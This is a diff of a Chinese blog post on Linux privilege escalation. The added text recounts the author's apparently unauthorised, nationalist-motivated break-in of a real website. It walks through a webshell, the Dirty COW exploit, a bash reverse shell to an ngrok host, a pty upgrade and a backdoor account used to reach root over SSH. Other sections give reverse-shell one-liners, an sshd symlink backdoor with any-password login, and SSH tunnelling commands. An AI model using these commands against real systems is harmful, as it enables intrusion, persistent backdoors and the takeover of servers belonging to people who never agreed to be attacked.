@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="笔记,渗透,黑阔,提权,Linux," />
+  <meta name="keywords" content="渗透,黑阔,提权,Linux,笔记,抗韩," />
 
 
 
@@ -79,23 +79,34 @@
 
 
 
-<meta name="description" content="前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文">
-<meta name="keywords" content="笔记,渗透,黑阔,提权,Linux">
+<meta name="description" content="Linux提权思路前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬">
+<meta name="keywords" content="渗透,黑阔,提权,Linux,笔记,抗韩">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux提权思路">
-<meta property="og:url" content="http://yoursite.com/2018/09/07/Linux提权思路/index.html">
+<meta property="og:title" content="Linux提权思路+实战">
+<meta property="og:url" content="http://yoursite.com/2018/09/20/Linux提权思路/index.html">
 <meta property="og:site_name" content="Mugen">
-<meta property="og:description" content="前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文">
+<meta property="og:description" content="Linux提权思路前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/1.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/2.png">
-<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/3.jpg">
-<meta property="og:image" content="http://yoursite.com/2018/09/07/Linux提权思路/4.jpg">
-<meta property="og:updated_time" content="2018-09-17T01:19:17.720Z">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/00.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/01.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/02.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/04.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/05.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/06.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/07.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/09.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/010.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/09/20/Linux提权思路/011.jpg">
+<meta property="og:updated_time" content="2018-09-20T16:16:21.404Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux提权思路">
-<meta name="twitter:description" content="前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬件抽象层、硬盘及文">
-<meta name="twitter:image" content="http://yoursite.com/2018/09/07/Linux提权思路/1.png">
+<meta name="twitter:title" content="Linux提权思路+实战">
+<meta name="twitter:description" content="Linux提权思路前言首先关于Linux提权我们得先明白几个概念。 linux发行版本 是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：  CentOS redhat ubuntu kali  linux内核 Linux系统内核指的是一个由Linus Torvalds负责维护，提供硬">
+<meta name="twitter:image" content="http://yoursite.com/2018/09/20/Linux提权思路/1.png">
 
 
 
@@ -125,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/07/Linux提权思路/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/09/20/Linux提权思路/"/>
 
 
 
 
 
-  <title>Linux提权思路 | Mugen</title>
+  <title>Linux提权思路+实战 | Mugen</title>
   
 
 
@@ -278,7 +289,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/07/Linux提权思路/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/Linux提权思路/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="lego">
@@ -295,7 +306,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Linux提权思路</h1>
+          <h1 class="post-title" itemprop="name headline">Linux提权思路+实战</h1>
         
 
         <div class="post-meta">
@@ -307,8 +318,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-07T12:22:33+08:00">
-                2018-09-07
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-20T21:22:33+08:00">
+                2018-09-20
               </time>
             
 
@@ -372,7 +383,7 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先关于Linux提权我们得先明白几个概念。</p>
+        <h1 id="Linux提权思路"><a href="#Linux提权思路" class="headerlink" title="Linux提权思路"></a>Linux提权思路</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先关于Linux提权我们得先明白几个概念。</p>
 <p>linux发行版本</p>
 <p>是我们常说的Linux操作系统，也即是由Linux内核与各种常用软件的集合产品，全球大约有数百款的Linux系统版本，每个系统版本都有自己的特性和目标人群， 例如：</p>
 <ul>
@@ -392,7 +403,7 @@
 <p>这样我们就得到了系统的内核版本</p>
 <p>可以用kali自带的searchsploit来搜索exploitdb中的漏洞利用代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux Debian 4</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/09/07/Linux提权思路/1.png" alt=""></p>
+<p><img src="/2018/09/20/Linux提权思路/1.png" alt=""></p>
 <p>我们可以添加系统信息缩小范围</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>如果手里只有webshell可以利用反弹shell来得到一个shell</p>
 <p>首先我们得有一个<strong>netcat</strong></p>
@@ -400,10 +411,10 @@
 <h4 id="直接连接目标主机"><a href="#直接连接目标主机" class="headerlink" title="直接连接目标主机"></a>直接连接目标主机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.1 8000</span><br></pre></td></tr></table></figure>
 <h3 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a>bash直接反弹</h3><p>bash一句话shell反弹：个人感觉最好用的用的方法就是使用的方法就是使用bash结合重定向方法的一句话，具体命令如下。</p>
 <p>（1） bash反弹一句话</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</span><br><span class="line">本地 nc -l -p 8080</span><br></pre></td></tr></table></figure>
 <p>（2）bash一句话命令详解</p>
 <p>以下针对常用的bash反弹一句话进行了拆分说明，具体内容如下。</p>
-<p><img src="/2018/09/07/Linux提权思路/2.png" alt=""></p>
+<p><img src="/2018/09/20/Linux提权思路/2.png" alt=""></p>
 <p>其实以上bash反弹一句完整的解读过程就是：</p>
 <p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
 <p>具体各种反弹shell方式可参照安全客linux各种一句话反弹shell总结<a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
@@ -414,7 +425,7 @@
 <p>反弹shell</p>
 <h4 id="python-一句话获取标准shell"><a href="#python-一句话获取标准shell" class="headerlink" title="python 一句话获取标准shell"></a>python 一句话获取标准shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
 <p>命令详解：python 默认就包含有一个pty的标准库 </p>
-<p><img src="/2018/09/07/Linux提权思路/3.jpg" alt=""></p>
+<p><img src="/2018/09/20/Linux提权思路/3.jpg" alt=""></p>
 <h4 id="linux-一句话添加账号"><a href="#linux-一句话添加账号" class="headerlink" title="linux 一句话添加账号"></a>linux 一句话添加账号</h4><p>（1）chpasswd 方法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd guest;echo &apos;guest:123456&apos;|chpasswd</span><br></pre></td></tr></table></figure>
 <p>（2）useradd -p 方法</p>
@@ -427,20 +438,76 @@
 <p>注册一个账号设置好</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ngrok tcp 9999</span><br></pre></td></tr></table></figure>
 <p>获得一个公网地址</p>
-<p><img src="/2018/09/07/Linux提权思路/4.jpg" alt=""></p>
+<p><img src="/2018/09/20/Linux提权思路/4.jpg" alt=""></p>
 <h4 id="screen命令"><a href="#screen命令" class="headerlink" title="screen命令"></a>screen命令</h4><p>语法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen [-AmRvx -ls -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;]</span><br></pre></td></tr></table></figure>
 <p>选项</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-A 　将所有的视窗都调整为目前终端机的大小。</span><br><span class="line">-d &lt;作业名称&gt; 　将指定的screen作业离线。</span><br><span class="line">-h &lt;行数&gt; 　指定视窗的缓冲区行数。</span><br><span class="line">-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。</span><br><span class="line">-r &lt;作业名称&gt; 　恢复离线的screen作业。</span><br><span class="line">-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</span><br><span class="line">-s 　指定建立新视窗时，所要执行的shell。</span><br><span class="line">-S &lt;作业名称&gt; 　指定screen作业的名称。</span><br><span class="line">-v 　显示版本信息。</span><br><span class="line">-x 　恢复之前离线的screen作业。</span><br><span class="line">-ls或--list 　显示目前所有的screen作业。</span><br><span class="line">-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。</span><br></pre></td></tr></table></figure>
 <p>常用screen参数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br></pre></td></tr></table></figure>
-<p>案例</p>
+<p>例子</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#创建名称为 ssh的回话</span><br><span class="line">screen -S lego</span><br><span class="line"></span><br><span class="line">#连接ngrok</span><br><span class="line">./ngrok tcp 9999 </span><br><span class="line"></span><br><span class="line">#退出到命令行</span><br><span class="line">ctl+A+D</span><br><span class="line"></span><br><span class="line">#查看回话</span><br><span class="line">screen -ls</span><br><span class="line"></span><br><span class="line">#登录到我刚刚创建的ssh</span><br><span class="line">screen -r lego</span><br></pre></td></tr></table></figure>
 <h4 id="ssh相关"><a href="#ssh相关" class="headerlink" title="ssh相关"></a>ssh相关</h4><p>Linux后门</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;</span><br></pre></td></tr></table></figure>
 <p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o &quot;StrictHostKeyChecking no&quot; -o UserKnownHostsFile=/dev/null -T -fND 192.168.0.110:8888 mail@127.0.0.1 -o 31337</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o &quot;StrictHostKeyChecking no&quot;  -T -fNR 8888:192.168.0.110:8888 proxy@公网ip</span><br></pre></td></tr></table></figure>
+<h1 id="我不是黑阔"><a href="#我不是黑阔" class="headerlink" title="我不是黑阔"></a>我不是黑阔</h1><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><blockquote>
+<p>编程玩的在好,我也不能写出完美的爱情</p>
+<p>渗透玩的在强,我也不能提权进你的心</p>
+<p>免杀玩的在狠,我也过不了你的主防御</p>
+<p>纵使我多么的不可一世,也不是你的admin</p>
+<p>会的再多又怎么样?没有了你,我就是一无所有</p>
+</blockquote>
+<p><img src="/2018/09/20/Linux提权思路/00.jpg" alt=""></p>
+<h2 id="正文-1"><a href="#正文-1" class="headerlink" title="正文"></a>正文</h2><h3 id="抗韩之路"><a href="#抗韩之路" class="headerlink" title="抗韩之路"></a>抗韩之路</h3><p>身为一名黑阔，</p>
+<p>总是会不进想起前辈们的中美黑客大战。</p>
+<p>物是人非事事休，</p>
+<p>欲语泪先流。</p>
+<p>想起那时候的一个个黑页，</p>
+<p>内心突然澎湃了起来。</p>
+<p>放我出去，我要日站。</p>
+<p><img src="/2018/09/20/Linux提权思路/01.jpg" alt=""></p>
+<p>身为一名黑阔，我明白我的责任所在。</p>
+<p>就在这时，我盯上了一个之前早已沦陷的站。</p>
+<p><img src="/2018/09/20/Linux提权思路/02.jpg" alt=""></p>
+<p>就在这一刻我明白，肩上扛负着什么—抗韩从日站做起。</p>
+<p>挂黑页 脱裤子 已经满足不了我了。</p>
+<p>我需要的是你的所有。</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>有了webshell之后，我看了一下我的权限。</p>
+<p>不够不够不够。我需要的是你的root。</p>
+<p>看发行版本，看内核。</p>
+<p><img src="/2018/09/20/Linux提权思路/04.jpg" alt=""></p>
+<p>原来是古物。</p>
+<p>脏牛走起</p>
+<p><img src="/2018/09/20/Linux提权思路/05.jpg" alt=""></p>
+<p>提权成功。</p>
+<p>但是由于菜刀的webshell并非是真实的shell，我无法切换到root用户。</p>
+<p>所以我要反弹shell出来。</p>
+<h4 id="内网映射"><a href="#内网映射" class="headerlink" title="内网映射"></a>内网映射</h4><p>身为一名黑阔，突然发现我竟然连个外网IP都没有。</p>
+<p><img src="/2018/09/20/Linux提权思路/06.jpg" alt=""></p>
+<p>在成为一名黑阔的路上，有条件要上，没有条件创造条件也要上。 </p>
+<p>没有外网就内网映射</p>
+<p>我在<a href="https://ngrok.com/上注册了一个账号" target="_blank" rel="noopener">https://ngrok.com/上注册了一个账号</a></p>
+<p><img src="/2018/09/20/Linux提权思路/07.jpg" alt=""></p>
+<p>ngrok启动</p>
+<p><img src="/2018/09/20/Linux提权思路/4.jpg" alt=""></p>
+<p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15234 0&gt;&amp;1</span><br><span class="line">kali上   nc -l -p 9998</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/20/Linux提权思路/09.jpg" alt=""></p>
+<p>然后再获得一个标准shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br></pre></td></tr></table></figure>
+<p>切换到DarkHQ</p>
+<p><img src="/2018/09/20/Linux提权思路/010.jpg" alt=""></p>
+<p>看看权限</p>
+<p>这个时候我是SSH是连不上去的，因为他禁了root权限登入ssh，所以我新建了一个用户</p>
+<p>即上面那句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd guest;echo &apos;guest:123456&apos;|chpasswd</span><br></pre></td></tr></table></figure>
+<p>ssh连上普通账户</p>
+<p>再切换到root账户</p>
+<p><img src="/2018/09/20/Linux提权思路/011.jpg" alt=""></p>
+<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>后排收徒加我QQ：110</p>
+<p>5Yir6Kej5LqG77yM5oiR54ix5L2g44CC</p>
 
       
     </div>
@@ -458,8 +525,6 @@
       
         <div class="post-tags">
           
-            <a href="/tags/笔记/" rel="tag"># 笔记</a>
-          
             <a href="/tags/渗透/" rel="tag"># 渗透</a>
           
             <a href="/tags/黑阔/" rel="tag"># 黑阔</a>
@@ -467,6 +532,10 @@
             <a href="/tags/提权/" rel="tag"># 提权</a>
           
             <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
+          
+            <a href="/tags/抗韩/" rel="tag"># 抗韩</a>
           
         </div>
       
@@ -479,8 +548,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/04/机器人技术基础/" rel="next" title="机器人技术基础">
-                <i class="fa fa-chevron-left"></i> 机器人技术基础
+              <a href="/2018/09/17/pwniphone/" rel="next" title="PWN by lego">
+                <i class="fa fa-chevron-left"></i> PWN by lego
               </a>
             
           </div>
@@ -488,10 +557,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/08/SSRF漏洞学习/" rel="prev" title="SSRF漏洞学习">
-                SSRF漏洞学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -594,7 +659,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -627,7 +692,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内核漏洞提权"><span class="nav-number">2.1.</span> <span class="nav-text">内核漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">2.2.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#开启本地监听"><span class="nav-number">2.2.1.</span> <span class="nav-text">开启本地监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#直接连接目标主机"><span class="nav-number">2.2.2.</span> <span class="nav-text">直接连接目标主机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bash直接反弹"><span class="nav-number">2.3.</span> <span class="nav-text">bash直接反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脏牛提权"><span class="nav-number">2.4.</span> <span class="nav-text">脏牛提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python-一句话获取标准shell"><span class="nav-number">2.4.1.</span> <span class="nav-text">python 一句话获取标准shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-一句话添加账号"><span class="nav-number">2.4.2.</span> <span class="nav-text">linux 一句话添加账号</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网穿透"><span class="nav-number">2.5.</span> <span class="nav-text">内网穿透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#screen命令"><span class="nav-number">2.5.1.</span> <span class="nav-text">screen命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh相关"><span class="nav-number">2.5.2.</span> <span class="nav-text">ssh相关</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux提权思路"><span class="nav-number">1.</span> <span class="nav-text">Linux提权思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文"><span class="nav-number">1.2.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内核漏洞提权"><span class="nav-number">1.2.1.</span> <span class="nav-text">内核漏洞提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.2.2.</span> <span class="nav-text">反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#开启本地监听"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">开启本地监听</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#直接连接目标主机"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">直接连接目标主机</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bash直接反弹"><span class="nav-number">1.2.3.</span> <span class="nav-text">bash直接反弹</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脏牛提权"><span class="nav-number">1.2.4.</span> <span class="nav-text">脏牛提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#python-一句话获取标准shell"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">python 一句话获取标准shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-一句话添加账号"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">linux 一句话添加账号</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内网穿透"><span class="nav-number">1.2.5.</span> <span class="nav-text">内网穿透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#screen命令"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">screen命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh相关"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">ssh相关</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#我不是黑阔"><span class="nav-number">2.</span> <span class="nav-text">我不是黑阔</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言-1"><span class="nav-number">2.0.1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#正文-1"><span class="nav-number">2.1.</span> <span class="nav-text">正文</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#抗韩之路"><span class="nav-number">2.1.1.</span> <span class="nav-text">抗韩之路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#提权"><span class="nav-number">2.1.1.1.</span> <span class="nav-text">提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网映射"><span class="nav-number">2.1.1.2.</span> <span class="nav-text">内网映射</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#尾声"><span class="nav-number">2.2.</span> <span class="nav-text">尾声</span></a></li></ol></li></ol></div>
             
 
           </div>
